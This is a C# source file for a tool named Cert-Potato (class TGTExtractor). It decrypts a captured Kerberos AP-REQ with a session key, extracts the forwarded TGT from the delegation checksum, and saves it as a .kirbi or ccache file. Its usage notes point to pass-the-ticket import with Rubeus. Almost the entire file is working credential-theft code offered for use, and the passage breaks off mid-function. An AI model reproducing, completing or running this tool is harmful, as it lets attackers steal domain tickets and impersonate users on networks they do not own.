// Cert-Potato.cs
// Extracts the forwarded TGT from an AP-REQ GSS token using the session key.
//
// Usage:
//   Cert-Potato.exe /apreq:<base64> /session_key:<base64> [/output:base64|ccache]
//
// Parameters:
//   /apreq        AP-REQ GSS token in Base64 (from ASPX output)
//   /session_key  Session key in Base64 (from ASPX output)
//   /output       Output format: base64 (default) or ccache
//
// Etype is auto-detected from the AP-REQ — no need to specify it.
//
// Examples:
//   Cert-Potato.exe /apreq:YII... /session_key:NsD57FK...==
//   Cert-Potato.exe /apreq:YII... /session_key:NsD57FK...== /output:ccache
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.ComponentModel;

class TGTExtractor
{
    // ── Key usage constants (RFC 4120) ────────────────────────────────────────
    const int KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11;
    const int KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14;

    // ── KERB_ETYPE values ─────────────────────────────────────────────────────
    const int ETYPE_DES_CBC_CRC = 1;
    const int ETYPE_DES_CBC_MD5 = 3;
    const int ETYPE_AES128_CTS_HMAC_SHA1_96 = 17;
    const int ETYPE_AES256_CTS_HMAC_SHA1_96 = 18;
    const int ETYPE_RC4_HMAC = 23;
    const int ETYPE_RC4_HMAC_EXP = 24;

    // Etypes to try in auto-detect order (most common first)
    static readonly int[] AutoEtypes = {
        ETYPE_AES256_CTS_HMAC_SHA1_96,
        ETYPE_AES128_CTS_HMAC_SHA1_96,
        ETYPE_RC4_HMAC,
        ETYPE_RC4_HMAC_EXP,
        ETYPE_DES_CBC_MD5,
        ETYPE_DES_CBC_CRC,
    };

    // Kerberos OID 1.2.840.113554.1.2.2
    static readonly byte[] KerberosOID = {
        0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02
    };

    // ── cryptdll.dll structs and P/Invokes ────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    struct KERB_ECRYPT
    {
        int Type0;
        public int BlockSize;
        int Type1;
        public int KeySize;
        public int Size;
        int unk2;
        int unk3;
        public IntPtr AlgName;
        public IntPtr Initialize;
        public IntPtr Encrypt;
        public IntPtr Decrypt;
        public IntPtr Finish;
        public IntPtr HashPassword;
        IntPtr RandomKey;
        IntPtr Control;
        IntPtr unk0_null;
        IntPtr unk1_null;
        IntPtr unk2_null;
    }

    [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = false)]
    static extern int CDLocateCSystem(int etype, out IntPtr pCSystem);

    delegate int KERB_ECRYPT_Initialize(byte[] key, int keySize, int keyUsage, out IntPtr pContext);
    delegate int KERB_ECRYPT_Decrypt(IntPtr pContext, byte[] data, int dataSize, byte[] output, ref int outputSize);
    delegate int KERB_ECRYPT_Finish(ref IntPtr pContext);

    // ── KerberosDecrypt — exact port of Rubeus Crypto.KerberosDecrypt ─────────

    static byte[] KerberosDecrypt(int eType, int keyUsage, byte[] key, byte[] data)
    {
        IntPtr pCSystemPtr;
        int status = CDLocateCSystem(eType, out pCSystemPtr);
        if (status != 0)
            throw new Win32Exception(status, "CDLocateCSystem failed for etype " + eType);

        KERB_ECRYPT pCSystem = (KERB_ECRYPT)Marshal.PtrToStructure(pCSystemPtr, typeof(KERB_ECRYPT));

        var pInit = (KERB_ECRYPT_Initialize)Marshal.GetDelegateForFunctionPointer(pCSystem.Initialize, typeof(KERB_ECRYPT_Initialize));
        var pDecrypt = (KERB_ECRYPT_Decrypt)Marshal.GetDelegateForFunctionPointer(pCSystem.Decrypt, typeof(KERB_ECRYPT_Decrypt));
        var pFinish = (KERB_ECRYPT_Finish)Marshal.GetDelegateForFunctionPointer(pCSystem.Finish, typeof(KERB_ECRYPT_Finish));

        IntPtr pContext;
        status = pInit(key, key.Length, keyUsage, out pContext);
        if (status != 0)
            throw new Win32Exception(status, "KERB_ECRYPT_Initialize failed");

        int outputSize = data.Length;
        if (data.Length % pCSystem.BlockSize != 0)
            outputSize += pCSystem.BlockSize - (data.Length % pCSystem.BlockSize);
        outputSize += pCSystem.Size;

        byte[] output = new byte[outputSize];
        status = pDecrypt(pContext, data, data.Length, output, ref outputSize);
        pFinish(ref pContext);

        if (status != 0)
            throw new Win32Exception(status, "KERB_ECRYPT_Decrypt failed");

        return output.Take(outputSize).ToArray();
    }

    // ── Argument parser ───────────────────────────────────────────────────────
    // Parses /key:value style arguments, case-insensitive keys

    static Dictionary<string, string> ParseArgs(string[] args)
    {
        var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        foreach (var arg in args)
        {
            if (!arg.StartsWith("/")) continue;
            int colon = arg.IndexOf(':');
            if (colon < 0)
            {
                // flag without value e.g. /help
                dict[arg.Substring(1)] = "";
            }
            else
            {
                string key = arg.Substring(1, colon - 1);
                string val = arg.Substring(colon + 1);
                dict[key] = val;
            }
        }
        return dict;
    }

    // ── Main ──────────────────────────────────────────────────────────────────

    static int Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        Banner();

        var opts = ParseArgs(args);

        // Show usage if no args or /help
        if (args.Length == 0 || opts.ContainsKey("help") || opts.ContainsKey("?"))
        {
            ShowUsage();
            return 0;
        }

        // ── Validate required parameters ──────────────────────────────────────

        if (!opts.ContainsKey("apreq") || string.IsNullOrEmpty(opts["apreq"]))
        {
            Console.WriteLine("[-] /apreq parameter is required.");
            Console.WriteLine("    Run with no arguments to see usage.");
            return 1;
        }

        if (!opts.ContainsKey("session_key") || string.IsNullOrEmpty(opts["session_key"]))
        {
            Console.WriteLine("[-] /session_key parameter is required.");
            Console.WriteLine("    Run with no arguments to see usage.");
            return 1;
        }

        // ── Parse inputs ──────────────────────────────────────────────────────

        byte[] apReqBytes;
        byte[] sessionKey;

        try { apReqBytes = Convert.FromBase64String(opts["apreq"].Trim()); }
        catch { Console.WriteLine("[-] /apreq value is not valid Base64."); return 1; }

        try { sessionKey = Convert.FromBase64String(opts["session_key"].Trim()); }
        catch { Console.WriteLine("[-] /session_key value is not valid Base64."); return 1; }

        // Output format — default to base64
        string outputFormat = "base64";
        if (opts.ContainsKey("output"))
        {
            outputFormat = opts["output"].Trim().ToLower();
            if (outputFormat != "base64" && outputFormat != "ccache")
            {
                Console.WriteLine("[-] /output must be 'base64' or 'ccache'.");
                return 1;
            }
        }

        Console.WriteLine("[*] AP-REQ size      : {0} bytes", apReqBytes.Length);
        Console.WriteLine("[*] Session key size : {0} bytes", sessionKey.Length);
        Console.WriteLine("[*] Output format    : {0}", outputFormat);
        Console.WriteLine("[*] Etype            : auto-detect");
        Console.WriteLine();

        // ── Step 1: Strip GSS-API wrapper, locate AP-REQ DER ─────────────────

        int oidIndex = SearchBytes(apReqBytes, KerberosOID);
        if (oidIndex < 0)
        {
            Console.WriteLine("[-] Kerberos OID not found in AP-REQ buffer.");
            return 1;
        }

        int apReqStart = oidIndex + KerberosOID.Length;
        if (apReqStart + 1 < apReqBytes.Length &&
            apReqBytes[apReqStart] == 0x01 && apReqBytes[apReqStart + 1] == 0x00)
            apReqStart += 2;

        byte[] apReqDer = new byte[apReqBytes.Length - apReqStart];
        Buffer.BlockCopy(apReqBytes, apReqStart, apReqDer, 0, apReqDer.Length);
        Console.WriteLine("[+] Located AP-REQ DER at offset {0} ({1} bytes)", apReqStart, apReqDer.Length);

        // ── Step 2: Parse AP-REQ, get encrypted authenticator ────────────────

        byte[] encAuthCipher;
        int authEtype;

        try { ParseApReq(apReqDer, out authEtype, out encAuthCipher); }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Failed to parse AP-REQ ASN.1: " + ex.Message);
            return 1;
        }

        Console.WriteLine("[+] Encrypted authenticator: {0} bytes, etype {1}",
            encAuthCipher.Length, EtypeToString(authEtype));

        // ── Step 3: Auto-detect etype and decrypt authenticator ───────────────
        // The etype from the AP-REQ tells us what to use. We also try all known
        // etypes in case the AP-REQ etype field doesn't match the session key.

        byte[] authenticatorPlain = null;
        int usedEtype = 0;

        // First try the etype declared in the AP-REQ itself
        var etypesToTry = new List<int> { authEtype };
        // Then append the rest of the auto-detect list (excluding duplicates)
        foreach (int e in AutoEtypes)
            if (!etypesToTry.Contains(e)) etypesToTry.Add(e);

        foreach (int e in etypesToTry)
        {
            try
            {
                Console.Write("[*] Trying etype {0} ({1})... ", e, EtypeToString(e));
                authenticatorPlain = KerberosDecrypt(
                    e, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, sessionKey, encAuthCipher);
                usedEtype = e;
                Console.WriteLine("OK");
                break;
            }
            catch
            {
                Console.WriteLine("failed");
            }
        }

        if (authenticatorPlain == null)
        {
            Console.WriteLine("[-] Could not decrypt authenticator with any known etype.");
            Console.WriteLine("    Make sure the session key matches the AP-REQ.");
            return 1;
        }

        Console.WriteLine("[+] Authenticator decrypted ({0} bytes) using etype {1}",
            authenticatorPlain.Length, EtypeToString(usedEtype));

        // ── Step 4: Extract KRB-CRED from GSS checksum ───────────────────────

        byte[] krbCredBytes;
        try { krbCredBytes = ExtractKrbCredFromAuthenticator(authenticatorPlain); }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Failed to extract KRB-CRED: " + ex.Message);
            return 1;
        }
        Console.WriteLine("[+] KRB-CRED extracted from GSS checksum ({0} bytes)", krbCredBytes.Length);

        // ── Step 5: Build .kirbi (KRB-CRED with plaintext enc-part) ──────────

        byte[] kirbiBytes;
        try { kirbiBytes = ExtractTicketFromKrbCred(krbCredBytes, sessionKey); }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Failed to build .kirbi: " + ex.Message);
            return 1;
        }

        // ── Output ────────────────────────────────────────────────────────────

        Console.WriteLine();
        string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");

        if (outputFormat == "base64")
        {
            string b64 = Convert.ToBase64String(kirbiBytes);
            string outFile = "tgt_" + timestamp + ".txt";

            Console.WriteLine("[+] Ticket size : {0} bytes", kirbiBytes.Length);
            Console.WriteLine("[+] Saved to    : " + outFile);
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] Extracted KRBTGT (Base64):");
            Console.WriteLine();
            Console.WriteLine(b64);
            Console.ResetColor();
            Console.WriteLine();

            File.WriteAllText(outFile, b64);
        }
        else // ccache
        {
            string outFile = "tgt_" + timestamp + ".ccache";
            byte[] ccache = KirbiToCCache(kirbiBytes);
            File.WriteAllBytes(outFile, ccache);
            Console.WriteLine("[+] Ticket size : {0} bytes", kirbiBytes.Length);
            Console.WriteLine("[+] CCache size : {0} bytes", ccache.Length);
            Console.WriteLine("[+] Saved to    : " + outFile);
            Console.WriteLine("[*] Use with: KRB5CCNAME={0} <tool>", outFile);
        }

        return 0;
    }

    // ── CCache writer ─────────────────────────────────────────────────────────
    // Converts a KRB-CRED (.kirbi) to MIT ccache format (version 4).
    // ccache format reference: https://web.mit.edu/kerberos/krb5-1.12/doc/formats/ccache_file_format.html

    static byte[] KirbiToCCache(byte[] kirbiBytes)
    {
        // Parse the KRB-CRED to extract fields we need for ccache
        // We need: client principal, realm, ticket bytes, session key, flags, times
        // from the EncKrbCredPart (now plaintext in our .kirbi)

        // ccache v4 structure:
        //   file_format_version  2 bytes  (0x0504)
        //   headerlen            2 bytes
        //   header tags          (none for v4 minimal)
        //   primary_principal    (client)
        //   credentials[]

        // Parse the KRB-CRED ASN.1 to extract what we need
        var info = ParseKirbiForCCache(kirbiBytes);

        var ms = new MemoryStream();
        var w = new BinaryWriter(ms);

        // File header
        WriteUInt16BE(w, 0x0504);  // version 4
        WriteUInt16BE(w, 12);      // header length = 12 (one header tag)

        // Header tag: DeltaTime (tag=1, len=8, unused=0, usec=0)
        WriteUInt16BE(w, 1);       // tag = 1 (DeltaTime)
        WriteUInt16BE(w, 8);       // taglen = 8
        WriteUInt32BE(w, 0);       // time_offset
        WriteUInt32BE(w, 0);       // usec_offset

        // Primary principal (client)
        WritePrincipal(w, info.ClientRealm, info.ClientName);

        // One credential entry
        WritePrincipal(w, info.ClientRealm, info.ClientName);  // client
        WritePrincipal(w, info.ServerRealm, info.ServerName);  // server (krbtgt)

        // Keyblock: etype + key
        WriteUInt16BE(w, (ushort)info.KeyType);
        WriteUInt16BE(w, (ushort)info.Key.Length);
        w.Write(info.Key);

        // Times: auth, start, end, renew
        WriteUInt32BE(w, info.AuthTime);
        WriteUInt32BE(w, info.StartTime);
        WriteUInt32BE(w, info.EndTime);
        WriteUInt32BE(w, info.RenewTill);

        // is_skey = 0, ticket_flags (big-endian)
        w.Write((byte)0);
        WriteUInt32BE(w, info.TicketFlags);

        // No addresses
        WriteUInt32BE(w, 0);

        // No authdata
        WriteUInt32BE(w, 0);

        // Ticket DER
        WriteUInt32BE(w, (uint)info.TicketDer.Length);
        w.Write(info.TicketDer);

        // No second_ticket
        WriteUInt32BE(w, 0);

        return ms.ToArray();
    }

    class CacheInfo
    {
        public string ClientRealm;
        public string[] ClientName;
        public string ServerRealm;
        public string[] ServerName;
        public int KeyType;
        public byte[] Key;
        public uint AuthTime;
        public uint StartTime;
        public uint EndTime;
        public uint RenewTill;
        public uint TicketFlags;
        public byte[] TicketDer;
    }

    static CacheInfo ParseKirbiForCCache(byte[] kirbi)
    {
        // KRB-CRED [APPLICATION 22] SEQUENCE { [0]..[3] }
        // Our .kirbi has plaintext enc-part (etype=0)
        // EncKrbCredPart ::= [APPLICATION 29] SEQUENCE { ticket-info SEQUENCE OF KrbCredInfo }
        // KrbCredInfo has: key, prealm, pname, flags, authtime, starttime, endtime, renew-till, srealm, sname

        int pos = 0;
        SkipTag(kirbi, ref pos);      // APPLICATION 22
        ReadLength(kirbi, ref pos);
        SkipTag(kirbi, ref pos);      // SEQUENCE
        ReadLength(kirbi, ref pos);

        byte[] ticketDer = null;
        byte[] encPartPlain = null;

        // Walk [0] pvno, [1] msg-type, [2] tickets, [3] enc-part
        int end = kirbi.Length;
        while (pos < end)
        {
            int tag = kirbi[pos]; pos++;
            int len = ReadLength(kirbi, ref pos);
            int fend = pos + len;

            if (tag == 0xa2) // [2] tickets
            {
                int savedPos = pos;
                SkipTag(kirbi, ref pos); ReadLength(kirbi, ref pos); // SEQUENCE OF
                int tStart = pos;
                SkipTag(kirbi, ref pos);
                int tLen = ReadLength(kirbi, ref pos);
                pos += tLen;
                ticketDer = new byte[pos - tStart];
                Buffer.BlockCopy(kirbi, tStart, ticketDer, 0, ticketDer.Length);
            }
            else if (tag == 0xa3) // [3] enc-part (plaintext, etype=0)
            {
                SkipTag(kirbi, ref pos); // SEQUENCE
                int innerLen = ReadLength(kirbi, ref pos);
                int innerEnd = pos + innerLen;
                while (pos < innerEnd)
                {
                    int ft = kirbi[pos++];
                    int fl = ReadLength(kirbi, ref pos);
                    int fe = pos + fl;
                    if (ft == 0xa2) // [2] cipher (our plaintext)
                    {
                        SkipTag(kirbi, ref pos);
                        int ol = ReadLength(kirbi, ref pos);
                        encPartPlain = new byte[ol];
                        Buffer.BlockCopy(kirbi, pos, encPartPlain, 0, ol);
                        pos += ol;
                    }
                    else { pos = fe; }
                }
            }

            pos = fend;
        }

        if (ticketDer == null || encPartPlain == null)
            throw new Exception("Could not parse .kirbi for ccache conversion.");

        // Parse EncKrbCredPart from encPartPlain
        // [APPLICATION 29] SEQUENCE { [0] ticket-info SEQUENCE OF KrbCredInfo }
        return ParseEncKrbCredPart(encPartPlain, ticketDer);
    }

    static CacheInfo ParseEncKrbCredPart(byte[] data, byte[] ticketDer)
    {
        var info = new CacheInfo();
        info.TicketDer = ticketDer;

        int pos = 0;

        // May start with APPLICATION 29 wrapper or directly SEQUENCE
        if (data[0] == 0x7d) // APPLICATION 29
        {
            SkipTag(data, ref pos);
            ReadLength(data, ref pos);
        }

        // SEQUENCE (EncKrbCredPart body)
        SkipTag(data, ref pos);
        ReadLength(data, ref pos);

        // [0] ticket-info SEQUENCE OF KrbCredInfo
        SkipTag(data, ref pos);  // [0] context
        ReadLength(data, ref pos);
        SkipTag(data, ref pos);  // SEQUENCE OF
        ReadLength(data, ref pos);
        // First KrbCredInfo SEQUENCE
        SkipTag(data, ref pos);
        int credLen = ReadLength(data, ref pos);
        int credEnd = pos + credLen;

        while (pos < credEnd)
        {
            int tag = data[pos++];
            int len = ReadLength(data, ref pos);
            int end = pos + len;

            if (tag == 0xa0) // [0] key EncryptionKey { etype, keyvalue }
            {
                SkipTag(data, ref pos); // SEQUENCE
                ReadLength(data, ref pos);
                // [0] keytype
                SkipTag(data, ref pos); SkipTag(data, ref pos);
                int kl = ReadLength(data, ref pos);
                info.KeyType = ReadInt(data, ref pos, kl);
                // [1] keyvalue
                SkipTag(data, ref pos); SkipTag(data, ref pos);
                int kvl = ReadLength(data, ref pos);
                info.Key = new byte[kvl];
                Buffer.BlockCopy(data, pos, info.Key, 0, kvl);
                pos += kvl;
            }
            else if (tag == 0xa1) // [1] prealm
            {
                SkipTag(data, ref pos);
                int rl = ReadLength(data, ref pos);
                info.ClientRealm = Encoding.ASCII.GetString(data, pos, rl);
                pos += rl;
            }
            else if (tag == 0xa2) // [2] pname PrincipalName
            {
                info.ClientName = ReadPrincipalName(data, ref pos, end);
                pos = end; continue;
            }
            else if (tag == 0xa3) // [3] flags
            {
                SkipTag(data, ref pos);
                int fl = ReadLength(data, ref pos);
                // BIT STRING: skip unused-bits byte, read 4 bytes flags
                pos++; // unused bits count
                info.TicketFlags = (uint)((data[pos] << 24) | (data[pos + 1] << 16) | (data[pos + 2] << 8) | data[pos + 3]);
                pos += 4;
            }
            else if (tag == 0xa4) // [4] authtime
            {
                info.AuthTime = ReadKerbTime(data, ref pos);
                pos = end; continue;
            }
            else if (tag == 0xa5) // [5] starttime
            {
                info.StartTime = ReadKerbTime(data, ref pos);
                pos = end; continue;
            }
            else if (tag == 0xa6) // [6] endtime
            {
                info.EndTime = ReadKerbTime(data, ref pos);
                pos = end; continue;
            }
            else if (tag == 0xa7) // [7] renew-till
            {
                info.RenewTill = ReadKerbTime(data, ref pos);
                pos = end; continue;
            }
            else if (tag == 0xa8) // [8] srealm
            {
                SkipTag(data, ref pos);
                int rl = ReadLength(data, ref pos);
                info.ServerRealm = Encoding.ASCII.GetString(data, pos, rl);
                pos += rl;
            }
            else if (tag == 0xa9) // [9] sname
            {
                info.ServerName = ReadPrincipalName(data, ref pos, end);
                pos = end; continue;
            }

            pos = end;
        }

        // Fallback defaults for any missing fields
        if (info.ClientName == null) info.ClientName = new[] { "unknown" };
        if (info.ServerName == null) info.ServerName = new[] { "krbtgt" };
        if (info.ClientRealm == null) info.ClientRealm = "";
        if (info.ServerRealm == null) info.ServerRealm = info.ClientRealm;
        if (info.Key == null) info.Key = new byte[32];

        return info;
    }

    static string[] ReadPrincipalName(byte[] data, ref int pos, int end)
    {
        // PrincipalName SEQUENCE { name-type, name-string SEQUENCE OF GeneralString }
        SkipTag(data, ref pos); // SEQUENCE
        ReadLength(data, ref pos);
        // [0] name-type — skip
        SkipTag(data, ref pos); SkipTag(data, ref pos);
        int ntl = ReadLength(data, ref pos);
        pos += ntl; // skip name-type value
        // [1] name-string
        SkipTag(data, ref pos); // [1] context
        ReadLength(data, ref pos);
        SkipTag(data, ref pos); // SEQUENCE OF
        int seqLen = ReadLength(data, ref pos);
        int seqEnd = pos + seqLen;
        var names = new System.Collections.Generic.List<string>();
        while (pos < seqEnd)
        {
            SkipTag(data, ref pos); // GeneralString
            int sl = ReadLength(data, ref pos);
            names.Add(Encoding.ASCII.GetString(data, pos, sl));
            pos += sl;
        }
        return names.ToArray();
    }

    static uint ReadKerbTime(byte[] data, ref int pos)
    {
        // KerberosTime is GeneralizedTime string "YYYYMMDDHHmmssZ"
        SkipTag(data, ref pos); // GeneralizedTime tag
        int len = ReadLength(data, ref pos);
        string s = Encoding.ASCII.GetString(data, pos, len);
        pos += len;
        try
        {
            var dt = DateTime.ParseExact(s, "yyyyMMddHHmmssZ",
                System.Globalization.CultureInfo.InvariantCulture,
                System.Globalization.DateTimeStyles.AssumeUniversal |
                System.Globalization.DateTimeStyles.AdjustToUniversal);
            return (uint)(dt - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
        }
        catch { return 0; }
    }

    // ── CCache binary helpers ─────────────────────────────────────────────────

    static void WriteUInt16BE(BinaryWriter w, ushort v)
    {
        w.Write((byte)(v >> 8));
        w.Write((byte)(v & 0xFF));
    }

    static void WriteUInt32BE(BinaryWriter w, uint v)
    {
        w.Write((byte)(v >> 24));
        w.Write((byte)((v >> 16) & 0xFF));
        w.Write((byte)((v >> 8) & 0xFF));
        w.Write((byte)(v & 0xFF));
    }

    static void WritePrincipal(BinaryWriter w, string realm, string[] components)
    {
        // name_type (4 bytes BE) + num_components (4 bytes BE) + realm + components
        WriteUInt32BE(w, 1); // NT-PRINCIPAL
        WriteUInt32BE(w, (uint)components.Length);
        byte[] realmBytes = Encoding.UTF8.GetBytes(realm);
        WriteUInt32BE(w, (uint)realmBytes.Length);
        w.Write(realmBytes);
        foreach (var c in components)
        {
            byte[] cb = Encoding.UTF8.GetBytes(c);
            WriteUInt32BE(w, (uint)cb.Length);
            w.Write(cb);
        }
    }

    // ── Usage ─────────────────────────────────────────────────────────────────

    static void ShowUsage()
    {
        Console.WriteLine("Usage:");
        Console.WriteLine("  TGTExtractor.exe /apreq:<base64> /session_key:<base64> [/output:base64|ccache]");
        Console.WriteLine();
        Console.WriteLine("Parameters:");
        Console.WriteLine("  /apreq        AP-REQ GSS token in Base64");
        Console.WriteLine("  /session_key  Session key in Base64");
        Console.WriteLine("  /output       Output format: base64 (default) or ccache");
        Console.WriteLine();
        Console.WriteLine("Examples:");
        Console.WriteLine("  TGTExtractor.exe /apreq:YII... /session_key:NsD57FK...==");
        Console.WriteLine("  TGTExtractor.exe /apreq:YII... /session_key:NsD57FK...== /output:ccache");
        Console.WriteLine();
        Console.WriteLine("Notes:");
        Console.WriteLine("  - Etype is auto-detected, no need to specify it");
        Console.WriteLine("  - base64 output can be imported with: Rubeus.exe ptt /ticket:<b64>");
        Console.WriteLine("  - ccache output can be used with:     KRB5CCNAME=tgt.ccache <tool>");
    }


    // ── AP-REQ Parser ─────────────────────────────────────────────────────────

    static void ParseApReq(byte[] der, out int etype, out byte[] cipher)
    {
        // AP-REQ ::= [APPLICATION 14] (0x6e) SEQUENCE { [0]..[4] }
        int pos = 0;

        SkipTag(der, ref pos);           // APPLICATION 14
        ReadLength(der, ref pos);

        SkipTag(der, ref pos);           // SEQUENCE 0x30
        int seqLen = ReadLength(der, ref pos);
        int seqEnd = pos + seqLen;

        etype = 0;
        cipher = null;

        while (pos < seqEnd)
        {
            int tag = der[pos++];
            int len = ReadLength(der, ref pos);
            int end = pos + len;

            if (tag == 0xa4) // [4] authenticator EncryptedData
            {
                SkipTag(der, ref pos);           // SEQUENCE
                int innerLen = ReadLength(der, ref pos);
                int innerEnd = pos + innerLen;

                while (pos < innerEnd)
                {
                    int fTag = der[pos++];
                    int fLen = ReadLength(der, ref pos);
                    int fEnd = pos + fLen;

                    if (fTag == 0xa0) // [0] etype INTEGER
                    {
                        SkipTag(der, ref pos);
                        int iLen = ReadLength(der, ref pos);
                        etype = ReadInt(der, ref pos, iLen);
                    }
                    else if (fTag == 0xa2) // [2] cipher OCTET STRING
                    {
                        SkipTag(der, ref pos); // OCTET STRING tag
                        int oLen = ReadLength(der, ref pos);
                        cipher = new byte[oLen];
                        Buffer.BlockCopy(der, pos, cipher, 0, oLen);
                        pos += oLen;
                    }
                    else { pos = fEnd; }
                }
                break;
            }
            else { pos = end; }
        }

        if (cipher == null)
            throw new Exception("Could not locate authenticator EncryptedData in AP-REQ.");
    }

    // ── Authenticator → KRB-CRED ──────────────────────────────────────────────

    static byte[] ExtractKrbCredFromAuthenticator(byte[] plain)
    {
        // Authenticator ::= [APPLICATION 2] SEQUENCE { ... [3] cksum ... }
        int pos = 0;

        SkipTag(plain, ref pos);         // APPLICATION 2
        ReadLength(plain, ref pos);

        SkipTag(plain, ref pos);         // SEQUENCE
        int seqLen = ReadLength(plain, ref pos);
        int seqEnd = pos + seqLen;

        while (pos < seqEnd)
        {
            int tag = plain[pos++];
            int len = ReadLength(plain, ref pos);
            int end = pos + len;

            if (tag == 0xa3) // [3] cksum
            {
                SkipTag(plain, ref pos);     // SEQUENCE
                int cLen = ReadLength(plain, ref pos);
                int cEnd = pos + cLen;

                int cksumtype = 0;
                byte[] cksumBytes = null;

                while (pos < cEnd)
                {
                    int fTag = plain[pos++];
                    int fLen = ReadLength(plain, ref pos);
                    int fEnd = pos + fLen;

                    if (fTag == 0xa0) // [0] cksumtype INTEGER
                    {
                        SkipTag(plain, ref pos);
                        int iLen = ReadLength(plain, ref pos);
                        cksumtype = ReadInt(plain, ref pos, iLen);
                    }
                    else if (fTag == 0xa1) // [1] checksum OCTET STRING
                    {
                        SkipTag(plain, ref pos);
                        int oLen = ReadLength(plain, ref pos);
                        cksumBytes = new byte[oLen];
                        Buffer.BlockCopy(plain, pos, cksumBytes, 0, oLen);
                        pos += oLen;
                    }
                    else { pos = fEnd; }
                }

                if (cksumtype != 0x8003)
                    throw new Exception(string.Format(
                        "Unexpected checksum type 0x{0:X} — expected 0x8003. " +
                        "Was ISC_REQ_DELEGATE used?", cksumtype));

                if (cksumBytes == null || cksumBytes.Length < 28)
                    throw new Exception("GSS checksum too short to contain KRB-CRED.");

                // Check GSS_C_DELEG_FLAG (bit 0 of Flags field at byte 20)
                if ((cksumBytes[20] & 0x01) == 0)
                    throw new Exception(
                        "GSS_C_DELEG_FLAG not set — forwarded TGT not present. " +
                        "Target must have unconstrained delegation enabled.");

                // KRB-CRED length at bytes 26..27 (little-endian)
                int krbCredLen = BitConverter.ToUInt16(cksumBytes, 26);
                byte[] krbCred = new byte[krbCredLen];
                Buffer.BlockCopy(cksumBytes, 28, krbCred, 0, krbCredLen);
                return krbCred;
            }
            else { pos = end; }
        }

        throw new Exception("Could not find [3] cksum in authenticator.");
    }

    // ── KRB-CRED → importable .kirbi ─────────────────────────────────────────
    // Rubeus expects a KRB-CRED where enc-part is plaintext (etype=0).
    // We decrypt the enc-part and re-encode the KRB-CRED with it unencrypted.

    static byte[] ExtractTicketFromKrbCred(byte[] krbCred, byte[] sessionKey)
    {
        // KRB-CRED ::= [APPLICATION 22] SEQUENCE {
        //   [0] pvno  [1] msg-type  [2] tickets SEQUENCE OF  [3] enc-part
        // }
        int pos = 0;

        SkipTag(krbCred, ref pos);       // APPLICATION 22
        ReadLength(krbCred, ref pos);

        SkipTag(krbCred, ref pos);       // SEQUENCE
        int seqLen = ReadLength(krbCred, ref pos);
        int seqEnd = pos + seqLen;

        // Track byte ranges of each field so we can re-assemble
        int pvnoStart = -1, pvnoEnd = -1;
        int msgtypeStart = -1, msgtypeEnd = -1;
        int ticketsStart = -1, ticketsEnd = -1;
        byte[] encPartCipher = null;
        int encPartEtype = 0;

        while (pos < seqEnd)
        {
            int tag = krbCred[pos];
            int tagStart = pos;
            pos++;
            int len = ReadLength(krbCred, ref pos);
            int end = pos + len;

            if (tag == 0xa0) // [0] pvno
            {
                pvnoStart = tagStart; pvnoEnd = end;
            }
            else if (tag == 0xa1) // [1] msg-type
            {
                msgtypeStart = tagStart; msgtypeEnd = end;
            }
            else if (tag == 0xa2) // [2] tickets SEQUENCE OF
            {
                ticketsStart = tagStart; ticketsEnd = end;
            }
            else if (tag == 0xa3) // [3] enc-part EncryptedData
            {
                // Parse enc-part to get etype and cipher
                int savedPos = pos;
                SkipTag(krbCred, ref pos);   // SEQUENCE
                int innerLen = ReadLength(krbCred, ref pos);
                int innerEnd = pos + innerLen;

                while (pos < innerEnd)
                {
                    int fTag = krbCred[pos++];
                    int fLen = ReadLength(krbCred, ref pos);
                    int fEnd = pos + fLen;

                    if (fTag == 0xa0) // [0] etype
                    {
                        SkipTag(krbCred, ref pos);
                        int iLen = ReadLength(krbCred, ref pos);
                        encPartEtype = ReadInt(krbCred, ref pos, iLen);
                    }
                    else if (fTag == 0xa2) // [2] cipher
                    {
                        SkipTag(krbCred, ref pos);
                        int oLen = ReadLength(krbCred, ref pos);
                        encPartCipher = new byte[oLen];
                        Buffer.BlockCopy(krbCred, pos, encPartCipher, 0, oLen);
                        pos += oLen;
                    }
                    else { pos = fEnd; }
                }
            }

            pos = end;
        }

        if (ticketsStart < 0)
            throw new Exception("Could not locate tickets in KRB-CRED.");
        if (encPartCipher == null)
            throw new Exception("Could not locate enc-part cipher in KRB-CRED.");

        // Decrypt enc-part, key usage 14
        Console.WriteLine("[*] Decrypting KRB-CRED enc-part (etype {0}, {1} bytes)...",
            EtypeToString(encPartEtype), encPartCipher.Length);

        byte[] encPartPlain = KerberosDecrypt(
            encPartEtype, KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART,
            sessionKey, encPartCipher);

        Console.WriteLine("[+] KRB-CRED enc-part decrypted ({0} bytes)", encPartPlain.Length);

        // Build KRB-CRED with plaintext enc-part (etype=0), same format Rubeus outputs
        // enc-part with etype=0 and no kvno:
        //   SEQUENCE {
        //     [0] etype = 0 (INTEGER)
        //     [2] cipher = encPartPlain (OCTET STRING)
        //   }
        byte[] etypeField = EncodeContextInt(0, 0);         // [0] INTEGER 0
        byte[] cipherField = EncodeContextOctet(2, encPartPlain); // [2] OCTET STRING
        byte[] encPartSeq = EncodeSequence(Concat(etypeField, cipherField));
        byte[] encPartCtx = EncodeContext(3, encPartSeq);   // [3]

        // Assemble: tickets bytes from original + new enc-part
        byte[] ticketBytes = new byte[ticketsEnd - ticketsStart];
        Buffer.BlockCopy(krbCred, ticketsStart, ticketBytes, 0, ticketBytes.Length);

        // pvno and msg-type from original
        byte[] pvnoBytes = new byte[pvnoEnd - pvnoStart];
